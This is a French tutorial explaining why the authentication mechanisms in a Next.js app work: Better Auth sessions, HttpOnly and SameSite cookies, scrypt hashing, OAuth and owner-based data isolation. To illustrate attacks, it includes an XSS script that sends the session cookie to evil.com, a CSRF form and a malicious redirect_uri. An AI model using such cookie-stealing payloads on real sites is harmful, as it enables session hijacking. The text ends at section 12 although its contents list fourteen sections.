# Phase 3 — Concepts en profondeur

> Document complémentaire à `phase-3.md`. Le premier explique **comment** mettre en place l'authentification ; celui-ci explique **pourquoi** chaque mécanisme fonctionne comme ça.
>
> Lecture suggérée : parcourir une première fois pour vue d'ensemble, puis revenir sur les concepts précis quand on en a besoin — surtout avant un déploiement, parce que la moindre erreur en authentification a des conséquences disproportionnées.

## Table des matières

1. [Le problème fondamental : pourquoi l'authentification est difficile](#1-le-problème-fondamental)
2. [La pile d'authentification de la Phase 3 : qui fait quoi](#2-la-pile-de-la-phase-3)
3. [Better Auth : la bibliothèque](#3-better-auth)
4. [Le modèle de données : User / Session / Account / Verification](#4-le-modèle-de-données)
5. [Les sessions : comment on garde quelqu'un connecté](#5-les-sessions)
6. [Les cookies de session : HttpOnly, SameSite, Secure](#6-les-cookies-de-session)
7. [scrypt + sel : le hachage de mot de passe](#7-scrypt-et-sel)
8. [Le secret cryptographique de signature](#8-le-secret-cryptographique)
9. [La route catch-all `[...all]`](#9-la-route-catch-all)
10. [Le middleware tRPC `protectedProcedure`](#10-le-middleware-protectedprocedure)
11. [OAuth 2.0 : le flux décortiqué](#11-oauth-2)
12. [Isolation par propriétaire : la sécurité multi-tenant](#12-isolation-par-propriétaire)
13. [ON DELETE CASCADE : suppression en cascade et Loi 25](#13-on-delete-cascade)
14. [Les pièges et leurs causes profondes](#14-les-pièges)

---

## 1. Le problème fondamental

Avant de comprendre les outils, il faut comprendre **ce qu'ils résolvent**.

À la fin de la Phase 2, l'application fonctionnait — mais **tout le monde voyait tout**. C'est acceptable pour un prototype, jamais pour un outil destiné à manipuler des documents juridiques. Il faut trois capacités fondamentales :

1. **Identifier** un utilisateur (qui est-il ?)
2. **Authentifier** son identité (peut-il prouver qu'il est bien lui ?)
3. **Autoriser** ses actions (a-t-il le droit de faire ça ?)

### Pourquoi c'est plus difficile qu'il n'y paraît

Implémenter naïvement l'authentification, c'est inviter une longue liste d'attaques bien connues :

| Attaque | Description | Mécanisme de défense correspondant |
|---|---|---|
| **Mot de passe en clair** | Si la base fuite, tous les comptes sont compromis | Hachage avec sel (scrypt) |
| **Rainbow tables** | Pré-calcul de hashs courants | Sel unique par utilisateur |
| **Brute force** | Tester des millions de mots de passe | Fonction de hachage lente (scrypt) |
| **XSS** | Du JavaScript malveillant lit le cookie de session | Cookie `HttpOnly` |
| **CSRF** | Un site malveillant déclenche une requête authentifiée | Cookie `SameSite=Lax` |
| **Session fixation** | L'attaquant force un identifiant de session connu | Token de session aléatoire généré à la connexion |
| **Forgerie de cookie** | L'attaquant fabrique un cookie « valide » | Signature avec un secret de 256 bits |
| **Vol d'identifiants OAuth** | Le mot de passe transite par l'app | Flux OAuth — l'app ne voit jamais le mot de passe Google/GitHub |

Chacune de ces attaques est documentée, exploitée en production, et — heureusement — résolue par des mécanismes standards. La question n'est pas « comment éviter X ? » mais « comment ne pas oublier d'en éviter une ? ».

### Pourquoi déléguer à une bibliothèque

Écrire son propre système d'authentification, c'est presque toujours une erreur :

- **Surface de risque énorme** — un seul oubli compromet tout
- **Évolution constante** — nouvelles attaques, nouveaux standards (passkeys, WebAuthn, etc.)
- **Travail répétitif sans valeur métier** — personne ne paie pour ton implémentation maison

Les bibliothèques d'authentification existent pour absorber cette complexité. On choisit la bonne (Phase 3 : **Better Auth**) et on lui fait confiance pour les détails cryptographiques, en gardant la maîtrise des données.

---

## 2. La pile de la Phase 3

```
┌─────────────────────────────────────────┐
│  Composants React (sign-up, sign-in,    │
│  auth-header)                           │
│  • signIn.email / signUp.email          │
│  • signIn.social / signOut              │
│  • useSession() hook                    │
└────────────────┬────────────────────────┘
                 │ POST /api/auth/...
┌────────────────▼────────────────────────┐
│  Route catch-all Next.js                │
│  app/api/auth/[...all]/route.ts         │
│  • toNextJsHandler(auth)                │
└────────────────┬────────────────────────┘
                 │ délégation
┌────────────────▼────────────────────────┐
│  Better Auth (serveur)                  │
│  • signature/vérification cookies       │
│  • hachage scrypt + sel                 │
│  • flux OAuth (échange code/token)      │
│  • gestion sessions                     │
└────────────────┬────────────────────────┘
                 │ via prismaAdapter
┌────────────────▼────────────────────────┐
│  Prisma Client (singleton)              │
│  • requêtes typées                      │
│  • lit/écrit user, session, account     │
└────────────────┬────────────────────────┘
                 │ SQL
┌────────────────▼────────────────────────┐
│  PostgreSQL                             │
│  • tables user, session, account,       │
│    verification                         │
└─────────────────────────────────────────┘
```

En parallèle, le côté tRPC :

```
Composant client → useQuery typé → /api/trpc/document.list
                                            │
                                            ▼
                              createTRPCContext (lit cookies)
                                            │
                                            ▼
                              auth.api.getSession() ──→ Postgres
                                            │
                                            ▼
                              protectedProcedure (refuse si pas de session)
                                            │
                                            ▼
                              ctx.prisma.document.findMany({
                                where: { userId: ctx.session.user.id }
                              })
```

Chaque couche a une responsabilité unique. C'est exactement la philosophie de la Phase 2 — appliquée à l'authentification.

---

## 3. Better Auth

### À quoi ça sert

Better Auth est une bibliothèque d'authentification **TypeScript-first** pour Node.js. Elle gère tout ce qui touche à l'identité :

- Inscription/connexion email + mot de passe
- OAuth (Google, GitHub, et beaucoup d'autres)
- Sessions persistantes
- Hachage des mots de passe
- Signatures de cookies
- Réinitialisation de mot de passe, vérification d'email, OTP, passkeys...

### Trois pièces à distinguer

1. **La config serveur** (`lib/auth.ts`) — où on déclare ce qu'on active (email/password, OAuth, etc.)
2. **Le client navigateur** (`lib/auth-client.ts`) — qui expose `signIn`, `signUp`, `signOut`, `useSession`
3. **L'adaptateur de base de données** — pont entre Better Auth et Prisma (`prismaAdapter`)

### Pourquoi Better Auth plutôt qu'autre chose

| Option | Force | Faiblesse |
|---|---|---|
| **Clerk** | UI prête à l'emploi, support enterprise | Service tiers, données chez eux, coût qui grimpe à l'échelle |
| **Auth.js (NextAuth)** | Très répandu, communauté énorme | En **mode patch-only** depuis septembre 2025 — pas de nouvelles fonctionnalités |
| **Lucia** | Léger, code limpide | Mode maintenance, l'auteur recommande de migrer |
| **Better Auth** | Activement développé en 2026, propriété des données, intégration native Prisma | Plus jeune, écosystème en croissance |

Le choix repose sur deux critères : **propriété des données** (essentielle pour du juridique) et **vitalité du projet** (un outil de sécurité abandonné = bombe à retardement).

### L'idée d'« adaptateur »

`prismaAdapter(prisma, { provider: "postgresql" })` est le pattern **adapter** appliqué à la persistance. Better Auth ne sait pas écrire du SQL — il ne sait que parler à un adaptateur abstrait. L'adaptateur Prisma traduit ces appels abstraits en requêtes Prisma typées.

Le bénéfice : si demain on voulait migrer vers MongoDB, on changerait juste l'adaptateur. Le code applicatif resterait identique.

---

## 4. Le modèle de données

Better Auth utilise **quatre modèles** pour stocker tout ce qui concerne les identités. La question naturelle : pourquoi quatre tables et pas une seule ?

### `User` — l'identité de la personne

```prisma
model User {
  id            String    @id
  name          String
  email         String
  emailVerified Boolean   @default(false)
  image         String?
  ...
  @@unique([email])
  @@map("user")
}
```

Représente **la personne** elle-même, indépendamment de la façon dont elle se connecte. Un utilisateur a **une seule** ligne `User` même s'il a plusieurs méthodes d'authentification.

### `Account` — les méthodes d'authentification

```prisma
model Account {
  id                    String   @id
  accountId             String   // identifiant chez le provider
  providerId            String   // "credential", "google", "github"
  userId                String   // → User
  password              String?  // pour "credential" seulement
  accessToken           String?  // pour OAuth
  refreshToken          String?
  ...
}
```

Représente **une façon de se connecter**. Un utilisateur peut avoir :

- 1 ligne `providerId="credential"` avec son mot de passe haché
- 1 ligne `providerId="google"` avec ses tokens Google
- 1 ligne `providerId="github"` avec ses tokens GitHub

**Les trois lignes pointent vers le même `userId`**. Quand l'utilisateur se connecte avec Google, Better Auth retrouve le `User` via la ligne `Account` correspondante.

> **Pourquoi cette séparation ?** Sans elle, on aurait une colonne `password` directement sur `User`, et il faudrait inventer des colonnes pour chaque OAuth provider (`googleId`, `githubId`, ...). Avec `Account`, ajouter un nouveau provider ne demande **aucune migration** — juste une nouvelle ligne.

### `Session` — les connexions actives

```prisma
model Session {
  id        String   @id
  expiresAt DateTime
  token     String   @unique
  userId    String
  ipAddress String?
  userAgent String?
}
```

Représente **une session active**. Un utilisateur peut en avoir plusieurs simultanément :
- Une sur son laptop (Safari)
- Une sur son téléphone (Chrome iOS)
- Une sur un autre laptop au bureau

Chaque session a un `token` unique qui correspond au cookie envoyé au navigateur. Quand l'utilisateur se déconnecte sur un appareil, **seule la session correspondante est invalidée** — les autres restent actives.

### `Verification` — codes temporaires

```prisma
model Verification {
  id         String   @id
  identifier String   // email à vérifier, par exemple
  value      String   // code OTP, token de reset
  expiresAt  DateTime
}
```

Stocke les **codes à durée limitée** : reset password, vérification d'email, OTP. Une fois utilisés (ou expirés), ils sont nettoyés.

### Le bénéfice du modèle à quatre tables

| Question | Réponse |
|---|---|
| Combien de sessions actives Alice a-t-elle ? | `SELECT COUNT(*) FROM session WHERE userId = ?` |
| Alice peut-elle se connecter avec Google ? | `SELECT 1 FROM account WHERE userId = ? AND providerId = 'google'` |
| Quels codes de reset sont en cours ? | `SELECT * FROM verification WHERE identifier = ?` |
| Forcer la déconnexion d'Alice partout | `DELETE FROM session WHERE userId = ?` |

Tout est **explicite** et **interrogeable**. Pas de magie cachée dans le code.

### Le `@@map` pour la convention de nommage

Better Auth force les **tables SQL en minuscules** (`user`, `session`, `account`, `verification`) avec `@@map("user")`. Mais Prisma utilise les **modèles en CamelCase** côté TypeScript (`User`, `Session`, etc.). Le `@@map` est la traduction entre les deux conventions.

> **Subtilité** : c'est pour ça que dans `psql`, il faut écrire `SELECT ... FROM "user"` (avec les guillemets, parce que `user` est un mot-clé SQL réservé). Alors que pour `Document` (qui n'a pas de `@@map`), le nom de table est `Document` en CamelCase, et les guillemets sont nécessaires pour préserver la casse.

---

## 5. Les sessions

### Le problème : HTTP est *stateless*

HTTP n'a **aucune mémoire** entre deux requêtes. Si l'utilisateur fait `GET /documents`, le serveur reçoit une requête HTTP brute sans aucune trace d'une connexion précédente. Pour rendre l'application « connectée », il faut ajouter quelque chose à chaque requête pour dire « c'est encore moi ».

### Deux approches : *stateful* vs *stateless*

**Sessions *stateful*** (notre approche) :
- Le serveur stocke la session en base (`Session` table)
- Le navigateur envoie un **token** dans un cookie
- À chaque requête, le serveur fait une lookup : `token → user`
- **Avantage** : on peut **invalider** une session côté serveur (`DELETE FROM session WHERE id = ?`)
- **Inconvénient** : une requête DB à chaque appel API

**Sessions *stateless* (JWT)** :
- Le serveur signe un token qui contient `{ userId, expiresAt }`
- Le navigateur l'envoie à chaque requête
- Le serveur **vérifie juste la signature**, pas besoin de la base
- **Avantage** : pas de DB lookup
- **Inconvénient** : **impossible à révoquer** avant expiration

Better Auth utilise du **stateful**. C'est le bon choix pour une app qui manipule des données sensibles : pouvoir déconnecter quelqu'un instantanément (compromission, départ d'employé, etc.) vaut le coût d'une requête DB.

### Anatomie de la table `Session`

```
id        : "sess_xK9pQm..."        — identifiant interne
token     : "tok_8nVbR3hZ..."       — ce qui voyage dans le cookie
userId    : "usr_aB2cDeFg..."       — à qui appartient la session
expiresAt : 2026-05-29 14:00:00    — 7 jours après création
createdAt : 2026-05-22 14:00:00
ipAddress : "192.168.1.42"         — pour audit / sécurité
userAgent : "Mozilla/5.0 ..."      — pour audit / sécurité
```

`ipAddress` et `userAgent` permettent (en option) de présenter à l'utilisateur une vue « vos appareils connectés » avec un bouton de déconnexion à distance.

### Le cycle de vie d'une session

1. **Création** : `POST /api/auth/sign-in/email` → ligne `Session` insérée + cookie `Set-Cookie`
2. **Utilisation** : chaque requête au serveur envoie le cookie → `auth.api.getSession({ headers })` retrouve la session
3. **Renouvellement** : selon la config, Better Auth peut prolonger automatiquement les sessions actives
4. **Destruction** : `POST /api/auth/sign-out` → `DELETE FROM session WHERE id = ?` + cookie invalidé

### Pourquoi 7 jours ?

604 800 secondes = 7 jours. C'est un compromis classique :
- Trop court (1 heure) : l'utilisateur doit se reconnecter en permanence — friction
- Trop long (1 an) : un appareil volé ou perdu reste connecté très longtemps — risque

7 jours est le défaut sain. À adapter selon le niveau de sensibilité de l'application.

---

## 6. Les cookies de session

### Le cookie envoyé par Better Auth

Quand l'utilisateur se connecte, le serveur répond avec un en-tête HTTP :

```
Set-Cookie: better-auth.session_token=tok_8nVbR3hZ...; Max-Age=604800; Path=/; HttpOnly; SameSite=Lax
```

Chaque attribut a une raison précise :

| Attribut | Rôle | Conséquence si omis |
|---|---|---|
| `better-auth.session_token=...` | Le **token** lui-même, identique à `Session.token` en base | — |
| `Max-Age=604800` | Le cookie expire dans 7 jours | Cookie de session (perdu à la fermeture du navigateur) |
| `Path=/` | Envoyé pour toutes les URLs du domaine | Cookie limité à un sous-chemin |
| `HttpOnly` | **JavaScript ne peut pas le lire** | XSS peut voler la session |
| `SameSite=Lax` | Pas envoyé sur certaines requêtes cross-site | Vulnérable au CSRF |
| `Secure` (en prod) | Uniquement sur HTTPS | Le cookie voyage en clair sur du HTTP |

### `HttpOnly` — protection XSS

XSS (Cross-Site Scripting) signifie qu'un attaquant a réussi à injecter du JavaScript dans la page. Imaginons que l'app affiche le titre d'un document sans échapper le HTML :

```html
<h1>${document.title}</h1>
```

Si un utilisateur malveillant crée un document avec comme titre `<script>fetch('https://evil.com?c=' + document.cookie)</script>`, ce code s'exécute dans le navigateur de **tous les autres utilisateurs** qui voient ce document.

**Sans `HttpOnly`** : `document.cookie` contient le token, l'attaquant le récupère, vole la session.

**Avec `HttpOnly`** : `document.cookie` ne contient **pas** le cookie de session. Le JavaScript injecté ne peut pas le lire. L'attaque XSS reste grave mais ne mène pas au vol de session.

### `SameSite=Lax` — protection CSRF

CSRF (Cross-Site Request Forgery) exploite le fait que les cookies sont **automatiquement** envoyés avec les requêtes sortantes vers leur domaine d'origine. Imaginons qu'Alice soit connectée à notre app. Elle visite `evil.com`, qui contient :

```html
<form action="https://hackathon-lab.example/api/documents/delete-all" method="POST">
  <input type="submit" value="Cliquez ici pour gagner !">
</form>
```

Si Alice clique, son navigateur envoie la requête **avec son cookie de session** — et l'app exécute l'action en pensant qu'Alice elle-même l'a demandée.

**Avec `SameSite=Lax`** : le navigateur **n'envoie pas** les cookies pour les requêtes POST cross-site. La requête arrive sans cookie, donc sans session, donc rejetée.

| Valeur SameSite | Comportement |
|---|---|
| `Strict` | Cookie jamais envoyé sur une requête cross-site (même cliquer sur un lien depuis Google) |
| `Lax` (notre choix) | Cookie envoyé sur navigation top-level (clic de lien), pas sur POST cross-site |
| `None` | Toujours envoyé — équivalent au comportement pré-2020 |

`Lax` est le **défaut moderne** des navigateurs depuis 2020. C'est le bon compromis sécurité/ergonomie.

### `Secure` en production

En développement, `Secure` n'est pas posé parce qu'on travaille en `http://localhost`. En production sur HTTPS, Better Auth ajoute automatiquement `Secure`, ce qui empêche le cookie de voyager en clair sur une connexion non chiffrée.

---

## 7. scrypt et sel

### Le problème : ne jamais stocker un mot de passe en clair

Si la base de données fuite (et **elle fuitera un jour** — c'est une question de quand, pas de si), les mots de passe ne doivent pas être lisibles. La solution : on stocke un **hash**, pas le mot de passe.

### Pourquoi pas un simple SHA-256

Hash naïf :
```
"motdepasse123" → SHA-256 → "ef92b778b...".
```

Trois problèmes :

1. **Rainbow tables** : un attaquant peut pré-calculer les hashs des 10 millions de mots de passe les plus courants. Si `"motdepasse123" → ef92b778b...`, c'est dans toutes les rainbow tables.
2. **Collisions par fréquence** : deux utilisateurs avec le même mot de passe ont le même hash. Si Alice et Bob utilisent tous deux `"Password1!"`, on le voit en regardant la table.
3. **Vitesse** : SHA-256 est conçu pour être **rapide**. Un GPU moderne calcule des **milliards** de hashs par seconde. Brute force trivial.

### La solution 1 : le sel

Un **sel** est une chaîne aléatoire **unique à chaque utilisateur**. On le concatène au mot de passe avant de hacher :

```
hash = scrypt("motdepasse123" + sel_alice)
hash = scrypt("motdepasse123" + sel_bob)
```

Même mot de passe, **hashs différents**. Les rainbow tables deviennent inutiles : il faudrait en pré-calculer une par sel possible (impraticable).

### La solution 2 : une fonction lente

scrypt n'est pas SHA-256. C'est une fonction de hachage **délibérément lente** :

- Calcul d'un hash : **~100 ms**
- GPU/ASIC : **inefficaces** parce que scrypt utilise beaucoup de mémoire (memory-hard)

À 100 ms par hash, brute force devient impraticable :

| Mots de passe à tester | Temps avec SHA-256 (GPU) | Temps avec scrypt |
|---|---|---|
| 1 million | 0,001 s | 100 000 s ≈ 27 h |
| 1 milliard | 1 s | ~3 ans |

Pour la connexion légitime : 100 ms est imperceptible. Pour l'attaquant : prohibitif.

### Le format en base

Dans la table `account` (lignes `providerId = "credential"`), la colonne `password` ressemble à :

```
71076087a7336072c5117e8eb956020e:901945d05d9a7128a7c1f79d8b820defd0...
```

C'est **deux valeurs** séparées par `:` :

| Partie | Longueur | Rôle |
|---|---|---|
| Avant `:` | 32 caractères hex = 16 octets | Le **sel** |
| Après `:` | 128 caractères hex = 64 octets | Le **hash** scrypt(password, sel) |

À la connexion, Better Auth :
1. Lit la ligne `account`, extrait `sel:hash`
2. Calcule `scrypt(password_saisi, sel)`
3. Compare au `hash` stocké
4. Si égal : authentification OK

> **Pourquoi le sel n'a pas besoin d'être secret** : il protège contre les rainbow tables, pas contre le brute force ciblé. Un attaquant qui a le sel doit quand même faire scrypt(candidat, sel) pour chaque candidat — c'est exactement la défense scrypt.

### Et les alternatives ?

| Fonction | Année | Caractéristique | Quand l'utiliser |
|---|---|---|---|
| **bcrypt** | 1999 | CPU-hard, limite à 72 caractères | Acceptable, vieillissant |
| **scrypt** | 2009 | Memory-hard | Notre choix Better Auth |
| **Argon2** | 2015 | Memory-hard, gagnant du Password Hashing Competition | Le plus moderne, recommandé OWASP |

Better Auth utilise scrypt par défaut. Argon2 est encore meilleur en théorie, mais scrypt reste largement suffisant pour notre usage.

---

## 8. Le secret cryptographique

### Pourquoi signer le cookie

Le cookie contient un token de session. Sans précaution, un attaquant pourrait essayer de **forger** un token en devinant un format probable. La défense : **signer** le cookie avec un secret.

Le mécanisme s'appelle **HMAC** (Hash-based Message Authentication Code) :

```
cookie_envoye = token + HMAC(token, BETTER_AUTH_SECRET)
```

À la réception, le serveur recalcule `HMAC(token_reçu, BETTER_AUTH_SECRET)` et compare. Si le token a été altéré, l'HMAC ne correspond plus.

**Conséquence** : sans connaître `BETTER_AUTH_SECRET`, un attaquant ne peut pas produire un cookie valide. Il aurait beau écrire `token=admin_session_token` dans son cookie, l'HMAC ne matchera pas.

### Pourquoi 32 octets

```bash
openssl rand -base64 32
```

32 octets = 256 bits. C'est la taille standard pour un secret HMAC parce qu'elle correspond à la sortie de SHA-256, l'algorithme sous-jacent. Plus court : moins d'entropie, vulnérable à brute force théorique. Plus long : pas de bénéfice supplémentaire.

256 bits d'entropie, c'est environ **10⁷⁷ possibilités**. À titre de comparaison : le nombre estimé d'atomes dans l'univers observable est ~10⁸⁰. Brute force est mathématiquement impossible.

### Les règles d'or des secrets

1. **Jamais en clair dans le code** — toujours dans `.env`, lui-même dans `.gitignore`
2. **Jamais dans un message** (Slack, email, screenshot, commit) — même un message « provisoire »
3. **Jamais réutilisé entre environnements** (dev, staging, production) — sinon un dev qui quitte garde l'accès à la prod
4. **Rotation périodique** en production — sur compromission ou planifiée

> **Réflexe juridique** : un secret partagé, c'est l'équivalent informatique d'une clé physique perdue. Si un secret a été dans un email un jour, il faut **le considérer compromis** et le faire tourner.

### Le `!` après `process.env.BETTER_AUTH_SECRET`

```typescript
clientSecret: process.env.GITHUB_CLIENT_SECRET!,
```

Le `!` (non-null assertion) dit à TypeScript : « je te garantis que c'est défini ». Si le secret est absent, l'app **plante immédiatement au démarrage** — comportement préférable à un bug silencieux qui n'apparaîtrait qu'au premier OAuth tenté en production.

C'est un cas où on **veut** crasher visiblement. Le silence est l'ennemi.

---

## 9. La route catch-all

### Le pattern de fichier Next.js

Next.js permet trois patterns de routes dynamiques :

| Pattern | Capture | Exemple d'URL | `params` reçu |
|---|---|---|---|
| `[id]` | **Un** segment | `/documents/abc` | `{ id: "abc" }` |
| `[...slug]` | **Plusieurs** segments | `/auth/sign-up/email` | `{ slug: ["sign-up", "email"] }` |
| `[[...slug]]` | Idem mais le segment peut être vide | `/` ou `/a/b/c` | `{ slug: undefined ou [...] }` |

Better Auth utilise `[...all]` (catch-all). Une seule route handler intercepte **tous** les endpoints `/api/auth/*` :

```
/api/auth/sign-up/email          ──┐
/api/auth/sign-in/email          ──┤
/api/auth/sign-out               ──┼──→ app/api/auth/[...all]/route.ts
/api/auth/get-session            ──┤
/api/auth/callback/google        ──┤
/api/auth/callback/github        ──┘
```

Le fichier ne fait essentiellement rien — il délègue à Better Auth :

```typescript
import { auth } from "@/lib/auth";
import { toNextJsHandler } from "better-auth/next-js";

export const { POST, GET } = toNextJsHandler(auth);
```

`toNextJsHandler(auth)` transforme l'objet `auth` (qui contient toute la logique) en handlers HTTP compatibles avec App Router.

### Pourquoi `[...all]` et pas un fichier par endpoint

Sans catch-all, il faudrait :
- `app/api/auth/sign-up/email/route.ts`
- `app/api/auth/sign-in/email/route.ts`
- `app/api/auth/sign-out/route.ts`
- `app/api/auth/get-session/route.ts`
- `app/api/auth/callback/google/route.ts`
- `app/api/auth/callback/github/route.ts`
- ... etc.

Chacun ferait la même chose : déléguer à Better Auth. Le catch-all évite cette duplication et **suit automatiquement** Better Auth quand il ajoute de nouveaux endpoints (mises à jour, plugins).

### Comparaison avec tRPC

| Système | Pattern | Pourquoi |
|---|---|---|
| **tRPC** | `[trpc]` (un seul segment) | Le nom de procédure tient sur un segment (`document.list`, `document.create`) |
| **Better Auth** | `[...all]` (plusieurs segments) | Hiérarchie variable (`sign-up/email`, `callback/google`, ...) |

Les deux patterns coexistent dans la même app, dans des dossiers différents : `app/api/trpc/[trpc]/` et `app/api/auth/[...all]/`.

---

## 10. Le middleware `protectedProcedure`

### Le problème

À la fin de Phase 2, toutes les procédures tRPC étaient **publiques** : n'importe qui pouvait appeler `document.list`. Il faut maintenant :
1. Lire la session de chaque requête entrante
2. Refuser celles sans session valide
3. Injecter `user.id` dans le contexte pour filtrer les données

Sans middleware, il faudrait copier-coller cette logique dans chaque procédure. C'est répétitif et **dangereux** — si un développeur oublie le check sur une procédure, brèche de sécurité.

### Le pattern middleware

tRPC permet de **composer** des procédures. `protectedProcedure` est juste `publicProcedure` + un middleware :

```typescript
export const protectedProcedure = t.procedure.use(async ({ ctx, next }) => {
  if (!ctx.session?.user) {
    throw new TRPCError({ code: "UNAUTHORIZED" });
  }
  return next({
    ctx: {
      ...ctx,
      session: ctx.session, // narrowing TypeScript
    },
  });
});
```

À l'usage :

```typescript
list: protectedProcedure.query(async ({ ctx }) => {
  // ici, ctx.session est garanti non-null grâce au middleware
  return ctx.prisma.document.findMany({
    where: { userId: ctx.session.user.id },
  });
});
```

**Sécurité par défaut** : un développeur qui crée une nouvelle procédure tape `protectedProcedure` par habitude. Pour rendre une procédure publique, il faut **explicitement** taper `publicProcedure` — ce qui force à se poser la question.

### Le type narrowing TypeScript

```typescript
if (!ctx.session?.user) {
  throw new TRPCError({ code: "UNAUTHORIZED" });
}
return next({
  ctx: {
    ...ctx,
    session: ctx.session, // ← TypeScript sait maintenant que c'est non-null
  },
});
```

Le `return next({ ctx: { ..., session: ctx.session } })` n'a pas l'air utile (on remplace `session` par lui-même), mais c'est ce qui dit à TypeScript :

> **Dans la procédure qui suit, `ctx.session` est garanti non-null.**

Sans ça, on aurait à écrire `ctx.session!.user.id` ou `ctx.session?.user.id` dans chaque procédure protégée — verbeux et propice aux erreurs.

### Lecture des cookies côté serveur

Pour lire la session à chaque appel tRPC, le contexte fait :

```typescript
export const createTRPCContext = cache(async () => {
  const session = await auth.api.getSession({
    headers: await headers(),
  });
  return { prisma, session };
});
```

- `headers()` (Next.js) retourne les en-têtes HTTP de la requête courante, **incluant le cookie**.
- `auth.api.getSession({ headers })` extrait le cookie `better-auth.session_token`, vérifie sa signature HMAC, fait un lookup `SELECT * FROM session WHERE token = ?`, et retourne `{ user, session }` ou `null`.
- `cache(...)` (React) garantit qu'une seule lookup est faite par requête, même si le contexte est lu plusieurs fois.

**Le `await` avant `headers()`** est nouveau : depuis Next.js 15, plusieurs APIs auparavant synchrones sont devenues async pour des raisons d'optimisation. Le piège : oublier le `await` ne donne pas d'erreur runtime — TypeScript râle, mais on est tenté de mettre un `as any`. Mauvaise idée.

---

## 11. OAuth 2.0

### Le problème que résout OAuth

Sans OAuth, pour se connecter via Google, il faudrait demander à l'utilisateur son **mot de passe Google**. C'est inacceptable :
- L'utilisateur ne nous fait pas confiance (et il a raison)
- Si on stocke ce mot de passe, on est responsable d'une fuite catastrophique
- On a accès à **tout** son compte Google, alors qu'on veut juste son email et son nom

OAuth 2.0 résout ce problème en introduisant une **délégation contrôlée** : on n'obtient jamais le mot de passe, juste l'autorisation d'accéder à certaines informations spécifiques.

### Les acteurs

| Acteur | Rôle | Exemple |
|---|---|---|
| **Resource Owner** | L'utilisateur lui-même | Alice |
| **Client** | L'application qui veut accéder à des données | Notre app Hackathon Lab |
| **Authorization Server** | Le service qui authentifie l'utilisateur | Google, GitHub |
| **Resource Server** | Le service qui détient les données | API Google, API GitHub (souvent le même que l'AS) |

### Le flux Authorization Code (utilisé par Better Auth)

```
1. Alice clique "Continuer avec GitHub"
   ↓
   Notre app redirige le navigateur d'Alice vers :
   https://github.com/login/oauth/authorize
     ?client_id=<NOTRE_CLIENT_ID>
     &redirect_uri=http://localhost:3000/api/auth/callback/github
     &scope=read:user user:email
     &state=<aléatoire pour prévenir CSRF>

2. GitHub présente à Alice :
   "Hackathon Lab demande l'accès à : email, profil. Autoriser ?"
   Alice clique "Autoriser".

3. GitHub redirige le navigateur d'Alice vers :
   http://localhost:3000/api/auth/callback/github
     ?code=<CODE_TEMPORAIRE>
     &state=<aléatoire>

4. Notre serveur (Better Auth) reçoit le code et appelle GitHub :
   POST https://github.com/login/oauth/access_token
     client_id=<NOTRE_CLIENT_ID>
     client_secret=<NOTRE_CLIENT_SECRET>    ← jamais visible côté navigateur
     code=<CODE_TEMPORAIRE>
   ↓
   GitHub vérifie et retourne :
     { access_token: "ghu_...", token_type: "bearer", ... }

5. Better Auth appelle GitHub avec l'access token :
   GET https://api.github.com/user (Authorization: Bearer ghu_...)
   ↓
   Réponse : { id: 12345, login: "alice", email: "alice@example.com", ... }

6. Better Auth :
   - Cherche s'il existe déjà un Account avec providerId="github" et accountId=12345
   - Si oui : connecte l'utilisateur existant
   - Si non : crée un User + un Account, puis connecte
   - Crée une session, pose le cookie
   - Redirige vers callbackURL ("/")
```

### Pourquoi le code temporaire

À l'étape 3, le **code** transite par le navigateur d'Alice (dans l'URL). Si un attaquant parvenait à l'intercepter, ça ne suffirait pas : pour l'échanger contre un access token, il faut **aussi** le `client_secret`, qui ne quitte **jamais** notre serveur.

Le code est :
- **À usage unique** : utilisable une seule fois
- **Court** : expire en quelques minutes
- **Lié au `client_id`** : un autre client ne peut pas l'utiliser

### Pourquoi le `redirect_uri` doit être exact

À l'étape 3, GitHub redirige vers le `redirect_uri` qu'on a déclaré. Cette URL doit correspondre **caractère pour caractère** à celle enregistrée dans l'OAuth App GitHub. Pourquoi :

Si un attaquant pouvait modifier le `redirect_uri`, il pourrait faire :
```
&redirect_uri=https://evil.com/steal-code
```

Le code lui arriverait directement. Avec la vérification stricte côté GitHub, l'attaque échoue.

**Convention Better Auth** : `redirect_uri = <base_url>/api/auth/callback/<provider>`. C'est codé en dur dans la lib.

### Le rôle du `state`

Le paramètre `state` (aléatoire, généré par notre serveur) est renvoyé à l'étape 3. À la réception, Better Auth vérifie que le `state` reçu correspond à celui qu'il a généré. Sans cette vérification, un attaquant pourrait forcer une victime à se connecter à **son** compte GitHub (attaque par confusion d'identité).

### `signIn.social` — un seul appel pour les deux cas

Côté code :
```typescript
await signIn.social({ provider: "github", callbackURL: "/" });
```

Cette fonction gère **identiquement** :
- Première fois (inscription) : crée User + Account
- Fois suivante (connexion) : retrouve User via Account

C'est différent de l'email/password où on distingue `signUp.email` et `signIn.email`. Avec OAuth, l'utilisateur ne sait pas (et ne doit pas savoir) si c'est sa première fois ou non — c'est transparent.

---

## 12. Isolation par propriétaire

### Le problème

À la fin de Phase 3D, toutes les procédures sont protégées (un visiteur non connecté reçoit 401). Mais **tous les utilisateurs connectés voient encore tous les documents**. Alice qui s'inscrit voit les documents de Bob. C'est inacceptable.

### La règle d'or : forcer l'identité côté serveur

Deux changements dans la procédure `create` :

```typescript
create: protectedProcedure
  .input(z.object({
    title: z.string().min(1).max(200),
    content: z.string().min(1),
    // ← PAS de userId dans le schéma
  }))
  .mutation(async ({ ctx, input }) => {
    return ctx.prisma.document.create({
      data: {
        title: input.title,
        content: input.content,
        userId: ctx.session.user.id, // ← forcé depuis la session
      },
    });
  }),
```

Deux propriétés cruciales :

1. **Le schéma Zod n'accepte pas `userId`** — si un attaquant envoie `{ title, content, userId: "autre_user_id" }`, Zod le rejette
2. **`userId` est écrit depuis `ctx.session.user.id`** — la valeur vient du serveur, pas du client

Cette discipline a un nom : **« ne jamais faire confiance au client »**. C'est l'un des principes fondateurs de la sécurité applicative.

### Le filtrage côté lecture

```typescript
list: protectedProcedure.query(async ({ ctx }) => {
  return ctx.prisma.document.findMany({
    where: { userId: ctx.session.user.id },
    orderBy: { createdAt: "desc" },
  });
}),
```

Le `where: { userId: ctx.session.user.id }` garantit qu'Alice ne voit que ses documents. Si on l'oublie, fuite immédiate.

### L'index sur `userId`

```prisma
@@index([userId])
```

Sans index, la requête `WHERE userId = ?` fait un **scan complet** de la table à chaque appel. Avec 10 documents, invisible. Avec 1 million de documents répartis sur 10 000 utilisateurs, désastreux.

L'index permet à Postgres de trouver instantanément les lignes correspondant à un `userId` donné, comme un index alphabétique dans un livre. Coût : un peu d'espace disque + un peu de temps à l'écriture.

